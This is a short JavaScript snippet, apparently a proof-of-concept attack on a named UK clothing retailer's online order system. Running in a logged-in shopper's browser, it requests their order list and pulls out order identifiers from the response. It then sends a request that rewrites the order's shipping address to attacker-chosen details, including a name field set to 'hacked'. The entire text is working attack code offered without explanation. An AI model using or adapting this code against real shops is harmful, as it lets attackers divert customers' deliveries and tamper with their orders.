fetch('https://www.petit-bateau.co.uk/on/demandware.store/Sites-PB_UK-Site/en_GB/Order-Orders', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
  },
  body: 'dwfrm_orders_orderlist_i0_show=See+my+order',
})
  .then(response => response.text())
  .then(html => {
    // Parse the response HTML to extract the link
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const link = doc.querySelector('a.button.primary-blue-button.modify');

    if (link) {
      // Extract orderID and orderNo from the link's href attribute
      const href = link.getAttribute('href');
      const match = href.match(/orderID=(\d+)&orderNo=(\d+)/);

      if (match) {
        const orderID = match[1];
        const orderNo = match[2];

        // Now you have orderID and orderNo
        console.log('Order ID:', orderID);
        console.log('Order No:', orderNo);

        // Send a GET request to change the address
        const changeAddrURL = `https://www.petit-bateau.co.uk/on/demandware.store/Sites-PB_UK-Site/en_GB/Order-ShippingAddressForm?orderID=${orderID}&orderNo=${orderNo}&format=ajax&dwfrm_shippingaddress_firstName=hacked&dwfrm_shippingaddress_lastName=test&dwfrm_shippingaddress_country=GB&dwfrm_shippingaddress_postal=BS22%206HE&dwfrm_shippingaddress_city=Test%20Address&dwfrm_shippingaddress_address1=High%20St&dwfrm_shippingaddress_address2=Test%20Address&dwfrm_shippingaddress_saidlocation=Test%20Address&dwfrm_shippingaddress_dialcode=%2B44&dwfrm_shippingaddress_phone=7951130860`;

        fetch(changeAddrURL, {
          method: 'GET',
        })
          .then(response => response.text())
          .then(result => {
            console.log('Address change result:', result);
          })
          .catch(error => {
            console.error('Error changing address:', error);
          });
      }
    }
  })
  .catch(error => {
    console.error('Error sending POST request:', error);
  });
